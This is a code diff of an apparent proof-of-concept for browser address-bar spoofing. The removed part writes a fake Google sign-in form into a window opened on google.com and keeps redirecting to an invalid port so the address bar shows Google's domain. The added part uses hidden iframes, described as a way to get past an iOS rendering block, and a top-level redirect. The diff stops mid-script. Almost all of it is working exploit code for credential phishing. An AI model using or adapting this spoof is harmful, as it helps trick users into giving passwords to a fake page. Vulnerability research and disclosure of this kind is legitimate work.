@@ -1,26 +1,12 @@
-<!DOCTYPE html>
-<html>
-<body>
-<button onclick="spoof()">Click to spoof</button>
+<html><body>
+<h2>Halo</h2>
+<!-- Multiple iframe warmups using /csi/ to bypass iOS rendering block -->
+<iframe src="https://www.google.com/csi" style="display:none;"></iframe>
+<iframe src="https://www.google.com/csi" style="display:none;"></iframe>
+<iframe src="https://www.google.com/favicon.ico" style="display:none;"></iframe>
 <script>
-function spoof() {
-    let win = window.open("https://www.google.com/csi");
-    let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
-        '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
-        '<h1>This is NOT Google!</h1>' +
-        '<p>Please enter your credentials:</p>' +
-        '<form style="margin-top:20px;">' +
-        '<input type="text" placeholder="Username" style="display:block; margin:10px auto; padding:8px; width:200px;">' +
-        '<input type="password" placeholder="Password" style="display:block; margin:10px auto; padding:8px; width:200px;">' +
-        '<button type="submit" style="padding:8px 16px; background-color:#4285F4; color:white; border:none; cursor:pointer;">Sign In</button>' +
-        '</form>' +
-        '</div>';
-    win.document.write(payload);
-    win.document.close();
-    setInterval(function() {
-        win.location.replace("https://www.google.com:8080/csi");
-    }, 500);  // Small interval to preserve the spoof
-}
-</script>
-</body>
-</html>
+setTimeout(() => {
+// Step 1: Redirect ke invalid port /csi/ (lock address bar, fail load, no content reset)
+top.location = "https://www.google.com:8080/csi";
+
+setTimeout(() => {
